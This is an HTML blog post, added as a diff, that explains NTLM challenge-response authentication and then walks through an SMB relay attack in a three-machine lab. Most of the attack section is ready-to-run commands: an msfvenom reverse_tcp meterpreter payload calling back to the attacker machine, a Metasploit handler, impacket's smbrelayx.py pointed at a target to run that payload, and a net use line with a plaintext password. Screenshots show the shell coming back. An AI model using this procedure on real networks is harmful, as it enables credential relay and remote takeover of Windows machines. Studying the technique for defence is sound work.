@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="smb重放攻击 [smb中间人]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>smb重放攻击 [smb中间人] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    主页
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    所有文章
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    关于自己
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    标签
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    分类
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    一起交流
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/07/20/smb-replay-attack/">
+                smb重放攻击 [smb中间人]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-07-20</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/smb-attack/">smb attack</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br></p>
+<h3 id="在演示smb重放攻击之前-我们需要先搞清楚ntlm的认证过程-因为smb登录也基于这个-正常情况下-ntlm的简要认证详细流程如下"><a href="#在演示smb重放攻击之前-我们需要先搞清楚ntlm的认证过程-因为smb登录也基于这个-正常情况下-ntlm的简要认证详细流程如下" class="headerlink" title="在演示smb重放攻击之前,我们需要先搞清楚ntlm的认证过程,因为smb登录也基于这个,正常情况下,ntlm的简要认证详细流程如下:"></a>在演示smb重放攻击之前,我们需要先搞清楚ntlm的认证过程,因为smb登录也基于这个,正常情况下,ntlm的简要认证详细流程如下:</h3><p><img src="/img/ntlm_auth.png" alt="ntlm认证过程"><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">client端  &lt; ----- &gt;  server端</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>,正常情况,当client端登陆时需要先输入username,password和domain(默认是.表示本地),之后client端会自己计算出password DES加密后的hash,并将此hash暂时保存在本地</div><div class="line"><span class="number">2</span>,接着,client端会将自己的username明文发送给DC(server)</div><div class="line"><span class="number">3</span>,此时,DC会生成一组<span class="number">8</span>字节的随机数,也叫challenge(挑战码),返回给client端</div><div class="line"><span class="number">4</span>,当client端在收到这个挑战码以后,会把先把它拷贝一份出来,然后再拿着这个挑战码和之前已经加密的密码hash再进行一次加密,加密后的东西叫response(响应),最后再将challenge,response和username一并发送给server端</div><div class="line"><span class="number">5</span>,server端在接收到client端传过来的这个三个值以后会将它们分别都转发给DC</div><div class="line"><span class="number">6</span>,DC在接收到username,response,challenge以后,会根据传过来的username,到自己的账号数据库中去查出来这个username所对应的hash,然后,再拿着这个hash和刚刚传过来的challenge再进行一次加密</div><div class="line"><span class="number">7</span>,最后,就剩比较了,把客户端传过来的response和在(<span class="number">6</span>)中最后加密的hash值进行对比,如果一致,ok,认证通过,登录成功,反之,则登录失败</div></pre></td></tr></table></figure>
+<p><br><br></p>
+<h2 id="现在-我们就来简单再现一下smb的整个重放攻击过程"><a href="#现在-我们就来简单再现一下smb的整个重放攻击过程" class="headerlink" title="现在,我们就来简单再现一下smb的整个重放攻击过程:"></a>现在,我们就来简单再现一下smb的整个重放攻击过程:</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">client端  &lt; ----- &gt;   攻击者 &lt; ----- &gt;  server端</div></pre></td></tr></table></figure>
+<p>和上面的拓扑基本一样,只不过在此时,在client端和server端中间多了个攻击者[但双方在整个通信过程中都并不知道攻击者的存在],此时,我们本来正常的认证过程就变成了下面的样子:<br><img src="/img/SMBRelay-02.png" alt="重放过程"><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>,client端还是正常向服务端发送登录请求,由于client端此时并不知道攻击者的存在,它以为请求是发送给了server端,但实际上它是先发给了攻击者</div><div class="line"><span class="number">2</span>,然后攻击者再拿着这个username假装成client端发送给server端,此时server端正常返回一个challenge</div><div class="line"><span class="number">3</span>,攻击者拿到这个challenge以后再把它返回给client端</div><div class="line"><span class="number">4</span>,而client端拿到challenge在本地和自己的password DES加密以后,会把这个response再次发送给攻击者,此时client依然还以为攻击者就是server端</div><div class="line"><span class="number">5</span>,最后,攻击者会拿着client端发过来的这个response再把它交给server端去验证</div><div class="line"><span class="number">7</span>,server端此时到自己的数据库中一对比,发现hash一致,认证通过,登录成功,可见,一次简易的smb中间人攻击就这样完成了</div></pre></td></tr></table></figure></p>
+<p><br><br></p>
+<h2 id="接着就来简单模拟下如何利用这种一攻击手法"><a href="#接着就来简单模拟下如何利用这种一攻击手法" class="headerlink" title="接着就来简单模拟下如何利用这种一攻击手法:"></a>接着就来简单模拟下如何利用这种一攻击手法:</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">首先,准备好三台机器,且在同一内网中,且已确保它们之间的通信没有任何问题</div><div class="line">受害者机器(win2008R2 en): <span class="number">192.168</span>.<span class="number">3.125</span></div><div class="line">攻击者机器(ubuntu <span class="number">16.04</span> LTS en): <span class="number">192.168</span>.<span class="number">3.136</span></div><div class="line">第三方机器(win2008R2 cn): <span class="number">192.168</span>.<span class="number">3.23</span></div></pre></td></tr></table></figure>
+<p>我们最终要达成的目的,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过smb重放攻击,获取目标机器(<span class="number">192.168</span>.<span class="number">3.125</span>)的meterpreter</div></pre></td></tr></table></figure></p>
+<p>在攻击者的机器上准备好下面的东西,生成并监听我们的马,下载impacket:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.136 LPORT=1234 -f exe -o /home/tools/shell.exe</span></div><div class="line">		</div><div class="line">msf  &gt; use exploit/multi/handler </div><div class="line">msf  &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">msf  &gt; set lport <span class="number">1234</span></div><div class="line">msf  &gt; set lhost <span class="number">192.168</span>.<span class="number">3.136</span></div><div class="line">msf  &gt; exploit -j</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip install pycrypto   安装依赖的加密库</span></div><div class="line"><span class="comment"># apt-get --reinstall install python-pyasn1 python-pyasn1-modules</span></div><div class="line"><span class="comment"># git clone https://github.com/CoreSecurity/impacket.git</span></div><div class="line"><span class="comment"># chmod -R 755 impacket</span></div><div class="line"><span class="comment"># cd impacket/</span></div><div class="line"><span class="comment"># python setup.py install</span></div><div class="line"><span class="comment"># cd examples/</span></div><div class="line"><span class="comment"># python smbrelayx.py -h   </span></div><div class="line">	-h 指定要攻击的机器</div><div class="line">	-e 当认证成功以后,指定要执行的文件,一般都是我们事先准备好的马</div></pre></td></tr></table></figure>
+<p>在第三方机器上执行如下命令,向攻击者传送smb流量,注意,我这里的账号密码其实就是192.168.3.125正确的系统账号密码:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net use \\192.168.3.136\c$ "lala!@#45" /user:"administrator"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/smbreplay_net_use.jpg" alt="往攻击机上执行net use"><br></p>
+<p>此时,当我们再回到攻击机上时就可以看到,当别人net use到攻击机上时,攻击者很轻易就捕捉到了smb 的登录凭证hash,然后,它又接着拿着这个hash到192.168.3.125(也就是我们的目标机器)去尝试登录,其实这就是所谓的重放,一旦登录成功,就会自动执行我们的木马(在这一点上有点类似原始的psexec)<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python smbrelayx.py -h 192.168.3.125 -e /home/tools/shell.exe</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/smbreplay_hash.jpg" alt="重放过程"><br></p>
+<p>可以看到,当我们重放登录成功,文件就会被正常执行,meterpreter亦被正常弹回<br><img src="/img/smbreplay_meterpreter.jpg" alt=""><br><br><img src="/img/smbreplay_system.jpg" alt=""><br><br><img src="/img/smbreplay_ipconfig.jpg" alt=""><br></p>
+<p>我们现在可以再试下,如果此时net use的密码不对,又会出现什么样的状况,很显然,下面的结果已经说的很清楚了,尝试在192.168.3.125上重放时失败了,原因已经很清楚了,密码不对嘛,马自然也就执行不了了,因为根本没法psexec嘛<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net use \\<span class="number">192.168</span>.<span class="number">3.136</span>\c$ <span class="string">"a!@#45"</span> /<span class="symbol">user:</span><span class="string">"administrator"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/smbreplay_net_use_filai.jpg" alt=""><br><br><img src="/img/smbreplay_faiel.jpg" alt=""><br></p>
+<p><br><br></p>
+<p>过程中需要注意的一些点:<br>&nbsp;&nbsp;&nbsp;&nbsp;因为smbrelayx本身并没有带类似smb嗅探的功能,所以,它并不能自动抓取内网中的所有smb流量,如果想让所有的流量都自动流过攻击者的机器,可能你还需要配合Responder来一起实现,这里只是为了给大家看下攻击后的效果,所以,我的net use 就直接指向了攻击机,这样一来smb流量自然就能流过它(攻击机)了,当我们直接net use到攻击机时,其实我们的smb hash也一并会发送给它,然后脚本会拿着这个hash到目标机器上去认证,认证成功后即可执行我们的马,此时meterpreter正常弹回,如果认证失败,则不进行任何操作,注意,因为我这里只是测试,实际中你是几乎不可能指望别人直接net use到攻击机上的,这就需要你配合smb嗅探来一起利用,让所有的smb流量经过你,然后抓取里面的登录凭证挨个到目标机器上去重放<br><br><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;单从攻击的原理上来讲,其实非常简单,也并非什么很新的技术,言辞比较粗糙,只是想把原理尽量跟大家说明白,既然已经有人帮我们实现了这样的脚本,我们就省的自己重复造轮子了,后期还会单独说明如何配合Responder全自动定向攻击特定内网机器,细心的朋友可能会发现,smb中间人,似乎跟,hash传递,票据窃取……都是类似的攻击手法,至于漏洞危害个人觉得还是比较大的,尤其是在windows内网中(比如域),因为它不是靠漏洞来攻击的,基于这个思路演变出来的攻击手法其实还有非常多,任何能产生smb登录的条件你都可以利用,篇幅原因就先说到这里吧,个人理解可能比较有限,欢迎大家一起来深入讨论,一直相信,抛砖才能引出玉嘛<br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/smb/">#smb</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klionsec@gmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <h2>blog by klion</h2>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
